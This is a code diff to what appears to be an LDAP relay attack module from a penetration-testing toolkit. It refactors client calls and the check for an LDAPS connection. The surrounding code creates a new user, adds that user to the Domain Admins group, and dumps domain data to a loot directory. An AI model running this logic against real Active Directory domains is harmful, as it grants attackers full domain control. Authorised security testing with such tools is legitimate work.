@@ -176,15 +176,15 @@ class LDAPAttack(Thread):
             'unicodePwd': '"{}"'.format(newPassword).encode('utf-16-le')
         }
 
-        res = self.client.connection.add('CN=%s,CN=Users,%s' % (newUser,domainDumper.root),['top','person','organizationalPerson','user'],ucd)
+        res = self.client.add('CN=%s,CN=Users,%s' % (newUser,domainDumper.root),['top','person','organizationalPerson','user'],ucd)
         if not res:
-            logging.error('Failed to add a new user: %s' % str(self.client.connection.result))
+            logging.error('Failed to add a new user: %s' % str(self.client.result))
         else:
             logging.info('Adding new user with username: %s and password: %s result: OK' % (newUser,newPassword))
 
         domainsid = domainDumper.getRootSid()
         dagroupdn = domainDumper.getDAGroupDN(domainsid)
-        res = self.client.connection.modify(dagroupdn, {
+        res = self.client.modify(dagroupdn, {
             'member': [(self.client.MODIFY_ADD, ['CN=%s,CN=Users,%s' % (newUser, domainDumper.root)])]})
         if res:
             logging.info('Adding user: %s to group Domain Admins result: OK' % newUser)
@@ -192,7 +192,7 @@ class LDAPAttack(Thread):
             addedDomainAdmin = True
             thread.interrupt_main()
         else:
-            logging.error('Failed to add user to Domain Admins group: %s' % str(self.client.connection.result))
+            logging.error('Failed to add user to Domain Admins group: %s' % str(self.client.result))
 
     def run(self):
         global dumpedDomain
@@ -203,12 +203,12 @@ class LDAPAttack(Thread):
         domainDumpConfig.basepath = self.config.lootdir
 
         #Create new dumper object
-        domainDumper = self.ldapdomaindump.domainDumper(self.client.server, self.client.connection, domainDumpConfig)
+        domainDumper = self.ldapdomaindump.domainDumper(self.client.server, self.client, domainDumpConfig)
 
         if domainDumper.isDomainAdmin(self.username):
             logging.info('User is a Domain Admin!')
             if self.config.addda:
-                if 'ldaps' in self.client.target:
+                if self.client.server.ssl:
                     self.addDA(domainDumper)
                 else:
                     logging.error('Connection to LDAP server does not use LDAPS, to enable adding a DA specify the target with ldaps:// instead of ldap://')
